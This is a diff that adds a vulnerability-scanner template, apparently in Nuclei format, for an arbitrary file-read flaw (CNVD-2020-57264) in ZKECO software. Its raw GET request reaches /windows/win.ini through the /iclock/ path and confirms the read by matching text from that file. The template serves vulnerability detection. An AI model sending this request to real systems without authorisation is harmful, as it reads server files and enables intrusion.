@@ -1,0 +1,29 @@
+id: poc-local-xray-e-zkeco-cnvd-2020-57264-read-file
+
+info:
+  name: poc-local-xray-e-zkeco-cnvd-2020-57264-read-file
+  author: capiton
+  severity: high
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-57264
+  tags: zkeco
+
+requests:
+  - raw:
+      - |
+        GET /iclock/ccccc/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    
+
+    matchers-condition: and
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: and
+        words:
+          - "for 16-bit app support"
